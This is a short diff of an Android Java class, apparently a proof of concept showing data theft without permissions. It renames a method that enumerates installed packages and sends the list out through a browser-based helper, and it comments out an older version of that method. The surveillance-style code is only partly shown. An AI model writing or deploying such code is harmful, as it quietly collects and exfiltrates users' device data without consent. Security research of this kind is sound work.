@@ -106,7 +106,7 @@ public class NoPermissionsActivity extends Activity {
         return URLEncoder.encode(kernel);
     }
 
-    private void stealAppDataNew() {
+    private void stealAppData() {
         List<PackageInfo> packList = getPackageManager().getInstalledPackages(0);
         StringBuilder send = new StringBuilder();
         for (int i = 0; i < packList.size(); i++) {
@@ -120,6 +120,7 @@ public class NoPermissionsActivity extends Activity {
         sendGzByBrowser(send.toString(), "apps");
     }
 
+    /*
     private void stealAppData() {
         BufferedReader applist;
         try {
@@ -152,6 +153,8 @@ public class NoPermissionsActivity extends Activity {
         }
 
     }
+     */
+
 
     private List<String> recurse(File dir) {
         List<String> subdir = new ArrayList<>();
